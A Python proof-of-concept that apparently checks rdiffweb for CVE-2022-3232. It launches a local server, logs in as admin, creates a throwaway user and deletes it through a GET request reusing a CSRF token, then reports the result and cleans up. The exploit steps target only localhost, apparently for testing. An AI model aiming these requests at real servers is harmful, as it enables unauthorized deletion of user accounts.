#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import random
import string
import subprocess
import time
import sys
import os
import shutil
import tempfile
from urllib.parse import urljoin

# --- Configuration ---
SERVER_LISTEN_HOST = "0.0.0.0"
CLIENT_CONNECT_HOST = "127.0.0.1"
PORT = 8000
TARGET_URL = f"http://{CLIENT_CONNECT_HOST}:{PORT}"
USERNAME = "admin"
PASSWORD = "admin123"


# --- Helper Functions ---
def print_info(message): print(f"[INFO] {message}")


def print_success(message): print(f"[SUCCESS] {message}")


def print_error(message): print(f"[ERROR] {message}")


def generate_random_string(length=8): return ''.join(
    random.choice(string.ascii_lowercase + string.digits) for i in range(length))


# --- PoC Logic for CVE-2022-3232 ---
def check_vulnerability():
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
    })

    try:
        # Step 1: Login as admin
        print_info("Attempting login as admin...")
        login_page_url = urljoin(TARGET_URL, '/login/')
        session.get(login_page_url, timeout=10)
        login_payload = {'login': USERNAME, 'password': PASSWORD, 'redirect': '/'}
        r = session.post(login_page_url, data=login_payload, allow_redirects=True, timeout=10)
        if "login" in r.url:
            print_error("Login failed.")
            return False
        print_success("Login successful.")

        # Step 2: Create a dummy user to delete later
        admin_users_url = urljoin(TARGET_URL, '/admin/users')
        print_info("Fetching CSRF token to create a user...")
        r = session.get(admin_users_url, timeout=10)
        csrf_token_create = re.search(r'name="csrf_token" value="([^"]+)"', r.text)
        if not csrf_token_create:
            print_error("Could not find CSRF token on admin/users page.")
            return False

        dummy_user = f"poc-user-{generate_random_string()}"
        print_info(f"Creating dummy user: {dummy_user}...")
        create_payload = {
            "csrf_token": csrf_token_create.group(1),
            "action": "add",
            "username": dummy_user,
            "password": "password123",
            "email": f"{dummy_user}@example.com",
            "role": "user",
            "active": "on"
        }
        r = session.post(admin_users_url, data=create_payload, allow_redirects=True, timeout=10)
        if dummy_user not in r.text:
            print_error("Failed to create dummy user.")
            return False
        print_success(f"Successfully created dummy user: {dummy_user}")

        # Step 3: Send malicious GET request to delete the user
        print_info(f"Attempting to delete user '{dummy_user}' via GET request...")

        # Note: A robust exploit would re-fetch the page for a fresh CSRF token if needed,
        # but for this app version, the same token is often reusable within the session.
        exploit_params = {
            'action': 'delete',
            'username': dummy_user,
            'csrf_token': csrf_token_create.group(1)
        }
        # This is the vulnerable action: using GET to delete
        session.get(admin_users_url, params=exploit_params, timeout=10)
        print_success("Malicious GET request sent.")

        # Step 4: Verify if the user was deleted
        print_info(f"Verifying if user '{dummy_user}' was deleted...")
        r_verify = session.get(admin_users_url, timeout=10)
        # If the username is NOT in the page, the deletion was successful
        return dummy_user not in r_verify.text

    except requests.exceptions.RequestException as e:
        print_error(f"A network error occurred: {e}")
        return False


# --- Main Execution (No changes from previous script) ---
if __name__ == '__main__':
    web_server_process = None
    exit_code = 1

    db_file_handle = tempfile.NamedTemporaryFile(suffix=".db", delete=False)
    db_path = db_file_handle.name
    db_uri = f"sqlite:///{db_path}"
    db_file_handle.close()

    try:
        # Phase 1: Start rdiffweb service
        print_info("--- PHASE 1: Starting rdiffweb service ---")
        server_command = [
            "rdiffweb", "--database-uri", db_uri, "--server-host", SERVER_LISTEN_HOST,
            "--server-port", str(PORT), "--admin-user", USERNAME, "--admin-password", PASSWORD,
            "--rate-limit", "0"
        ]

        print_info(f"Executing command: {' '.join(server_command)}")
        web_server_process = subprocess.Popen(
            server_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Phase 2: Wait for service to be ready
        print_info("--- PHASE 2: Waiting for service to be ready ---")
        wait_time = 15
        print_info(f"Fixed wait for {wait_time} seconds for server warm-up...")
        time.sleep(wait_time)

        print_info(f"Checking network connectivity with curl: curl {TARGET_URL}/login/")
        curl_check = subprocess.run(["curl", "-sf", "-o", "/dev/null", f"{TARGET_URL}/login/"], timeout=5)
        if curl_check.returncode == 0:
            print_success("curl connection successful! Service is confirmed to be ready.")
            server_ready = True
        else:
            print_error(f"curl connection failed with exit code: {curl_check.returncode}.")
            server_ready = False
            raise RuntimeError("Could not connect to the server via curl.")

        # Phase 3: Execute vulnerability check
        print_info("--- PHASE 3: Executing vulnerability check ---")
        is_vulnerable = check_vulnerability()

        # Phase 4: Final Conclusion
        print_info("--- PHASE 4: Final Conclusion ---")
        if is_vulnerable:
            print_success("✅ CONCLUSION: Target is VULNERABLE to CVE-2022-3232.")
            exit_code = 0
        else:
            print_error("❌ CONCLUSION: Target does not appear to be vulnerable.")

    except Exception as e:
        print_error(f"An unexpected error occurred: {e}")
    finally:
        # Phase 5: Cleanup
        print_info("--- PHASE 5: Cleaning up ---")
        if web_server_process:
            print_info(f"Terminating rdiffweb service (PID: {web_server_process.pid})...")
            web_server_process.terminate()
            try:
                stdout, stderr = web_server_process.communicate(timeout=10)
                print_success("Service terminated.")
            except subprocess.TimeoutExpired:
                print_error("Service did not terminate gracefully, forcing kill.")
                web_server_process.kill()
                stdout, stderr = web_server_process.communicate()

            if exit_code != 0:
                print("\n--- Server STDOUT ---\n" + (stdout or "Not available."))
                print("\n--- Server STDERR ---\n" + (stderr or "Not available."))

        if os.path.exists(db_path):
            print_info(f"Deleting temporary database file: {db_path}")
            os.remove(db_path)

        print_info("Automated check finished.")
        sys.exit(exit_code)